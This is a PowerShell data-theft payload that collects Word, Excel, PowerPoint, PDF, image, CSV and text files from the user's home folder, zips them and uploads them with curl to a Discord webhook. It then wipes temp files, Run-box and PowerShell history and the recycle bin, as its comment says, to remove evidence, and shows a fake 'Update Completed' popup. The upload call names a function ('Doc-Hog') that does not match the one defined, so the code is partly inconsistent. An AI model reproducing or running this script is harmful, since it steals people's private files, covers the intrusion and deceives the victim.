$Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse

$types = @{
    "*.docx" = "Word";
    "*.doc" = "Word";
    "*.pptx" = "PowerPoint";
    "*.xlsx" = "Excel";
    "*.pdf" = "PDF";
    "*.jpeg" = "JPEG";
    "*.png" = "PNG";
    "*.jpg" = "JPEG";
    "*.csv" = "CSV";
    "*.txt" = "Text";
}

foreach ($type in $types.Keys) {
    $filteredFiles = $Files | Where-Object {$_.Name -like $type}

    if ($filteredFiles) {
        $zipFile = "$env:TEMP\$($types[$type]).zip"

        $filteredFiles | Compress-Archive -DestinationPath $zipFile

        Doc-Hog -file $zipFile -text "Uploading $($types[$type]) files"
    }
}

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}

 

############################################################################################################################################################

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		
############################################################################################################################################################

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
